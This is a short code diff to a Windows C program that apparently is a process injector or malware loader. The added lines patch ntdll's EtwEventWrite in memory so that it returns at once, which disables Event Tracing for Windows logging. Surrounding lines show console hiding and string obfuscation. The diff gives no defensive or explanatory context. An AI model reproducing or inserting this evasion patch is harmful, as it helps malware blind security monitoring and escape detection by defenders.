@@ -72,7 +72,16 @@ int main(void) {
 	int pido = 0;
         HANDLE hProc = NULL;	
 	
-	int processors();
+	void * addr = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
+        VirtualProtect(addr, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
+
+        #ifdef _WIN64
+        memcpy(addr, "\x48\x33\xc0\xc3", 4);            
+        #else
+        memcpy(addr, "\x33\xc0\xc2\x14\x00", 5);                
+        #endif  
+
+        VirtualProtect(addr, 4096, oldprotect, &oldprotect);
 	
 	strrev(Random3);
 	FreeConsole();
